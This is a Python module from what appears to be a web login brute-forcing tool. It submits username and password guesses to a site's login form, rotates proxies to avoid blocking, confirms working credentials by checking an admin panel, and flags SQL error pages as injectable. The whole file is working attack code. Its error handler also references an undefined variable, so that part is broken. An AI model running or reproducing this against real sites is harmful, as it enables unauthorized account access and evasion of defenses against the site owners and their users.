import utils
from cores.actions import randomFromList
from cores.check import parseLoginForm, check_sqlerror

def check_condition(options, proc, loginInfo):

	"""
		Check logged in successfully condition.
		This function will check SQL injection as well
			return 0 -> False
			return 1 -> True
			return 2 -> Should be SQL Injection error-based
	"""
	if options.panel_url:
		# User provided panel url (/wp-admin/ for example, repopen this url to check sess)
		proc.open_url(options.panel_url)
		if not parseLoginForm(proc.forms()):# != loginInfo:
			if check_sqlerror(proc.get_resp()):
				return 2
			else:
				return 1
		else:
			return 0
	else:
		# User provided direct login URL (/wp-login.php).
		# DEBUG
		# proc.open(options.url)
		# if parseLoginForm(proc.forms()) != loginInfo:
		# 	return 1
		# else:
		# 	return 0
		if check_sqlerror(proc.get_resp()):
			return 2
		else:
			return 1


def submit(options, loginInfo, tryCred, result):
	# if options.tech == "mechanize":
	# 	from libs.mbrowser import mBrowser as Browser
	# elif options.tech == "selenium":
	# 	from libs.sbrowser import sBrowser as Browser 
	
	# frmLoginID, frmFields = loginInfo
	tryPassword, tryUsername = tryCred

	# proc = Browser(options.timeout) # TODO recovery here

	# BREAK if we had valid payload?
	# if options.options["-p"] == "sqli" and len(list(result.queue)) > 1:
	# 	return True
	
	if tryUsername in [x[1] for x in list(result.queue)]:
		return True
	
	from libs.mbrowser import Browser
	try:
		proc = Browser()
		if options.proxy:
		# Set proxy connect
			proxyAddr = randomFromList(options.proxy)
			proc.setproxy(proxyAddr)
		else:
			proxyAddr = ""

		proc.open_url(options.login_url)
		_form = parseLoginForm(proc.forms())

		if not _form:
			if options.verbose:
				utils.printf("[x] LoginBrute: No login form found. Possibly get blocked!")
			return False
		else:
			frmCtrl, frmFields = _form
			frmLoginID, btnSubmit = frmCtrl
		if options.verbose and loginInfo != _form:
			utils.printf("[+] Warning: Form field has been changed!")	
		#	Select login form
		# page_title = proc.title()
		#	Send request
		
		#	Reload the browser. For javascript redirection and others...
		# proc.reload()
		#	If no login form -> maybe success. Check conditions
		resp = proc.xsubmit(frmCtrl, frmFields, tryCred)
		if options.verbose:
			if len(frmFields) == 2:
				utils.printf("[+] [%s=(%s); %s=(%s)] <--> %s" %(frmFields[1], tryUsername, frmFields[0], tryPassword, proxyAddr), 'norm')
			else:
				utils.printf("[+] [%s=(%s)] <--> %s" %(frmFields[0], tryPassword, proxyAddr), 'norm')

		if not parseLoginForm(proc.forms()):# != loginInfo:
			test_result = check_condition(options, proc, loginInfo)
			if test_result == 1:
				#utils.printf("[*] Page title: ['%s']" %(proc.title()), "good")
				# "If we tried login form with username+password field"
				
				if tryUsername:
					if resp.status_code == 403:
						utils.printf("[x] 403 forbidden: [%s:%s] <--> %s" %(tryUsername, tryPassword, proxyAddr), "bad")
					elif resp.status_code == 404:
						utils.printf("[x] 404 not found: [%s:%s] <--> %s" %(tryUsername, tryPassword, proxyAddr), "bad")
					elif resp.status_code >= 500:
						utils.printf("[x] %s Server error [%s:%s] <--> %s" %(resp.status_code, tryUsername, tryPassword, proxyAddr), "bad")
					else:
						utils.printf("[*] Found: [%s:%s] [%s]" %(tryUsername, tryPassword, proc.get_title()), "good")
						result.put([options.url, tryUsername, tryPassword])
				# "Else If we tried login form with password field only"
				else:
					if resp.status_code == 403:
						utils.printf("[x] 403 forbidden: [%s:%s] %s" %(tryUsername, tryPassword, proxyAddr), "bad")
					elif resp.status_code == 404:
						utils.printf("[x] 404 not found: [%s:%s] %s" %(tryUsername, tryPassword, proxyAddr), "bad")
					elif resp.status_code >= 500:
						utils.printf("[x] %s Server error: [%s:%s] %s" %(resp.status_code, tryUsername, tryPassword, proxyAddr), "bad")
					else:
						utils.printf("[*] Found: [%s] [%s]" %(tryPassword, proc.get_title()), "good")
						result.put([options.url, tryUsername, tryPassword])
			elif test_result == 2 and options.verbose:
				utils.printf("[+] SQL Injection vulnerable found")
				utils.printf("   %s" %([tryUsername, tryPassword]), "norm")
			else:
				# Possibly Error. But sometime it is true
				if options.verbose:
					utils.printf("[x] Get error page: %s" %([tryUsername, tryPassword]), "bad")
					utils.printf("   [x] Page title: ['%s']" %(proc.get_title()), "bad")
		# "Login form is still there. Oops"
		else:
			# TODO test if web has similar text (static)
			if check_sqlerror(proc.get_resp()) and options.verbose:
				utils.printf("[+] SQL Injection vulnerable found")
				utils.printf("   %s" %([tryUsername, tryPassword]), "norm")
			if options.verbose:
				if tryUsername:
					utils.printf("[-] Failed: [%s:%s] <--> %s ==> %s" %(tryUsername, tryPassword, proxyAddr, proc.get_title()), "bad")
				else:
					utils.printf("[-] Failed: [%s] <--> %s ==> %s" %(tryPassword, proxyAddr, proc.get_title()), "bad")

				
		return True

	except Exception as error:
		"""
			Sometimes, web servers return error code because of bad configurations,
			but our cred is true.
			This code block showing information, for special cases
		"""

		try:
			# Unauthenticated
			if type(err.code) == int and err.code == 401:
				if options.verbose:
					utils.printf("[-] Failed: %s" %([tryUsername, tryPassword]), "bad")
			# Server misconfiguration? Panel URL is deleted or wrong
			elif error.code == 404:
				utils.printf("[x] %s: %s" %(error, tryCred[::-1]), "bad")
				if options.verbose:
					utils.printf("   %s" %(proc.url()), "bad")
			# Other error code
			else:
				if options.verbose:
					utils.printf("[x] (%s): %s" %(proc.url(), tryCred[::-1]), "bad")
		except:
			# THIS BLOCKED BY WAF
			utils.printf("[x] Loginbrute: %s" %(error), "bad")
			return False

	finally:
		proc.close()
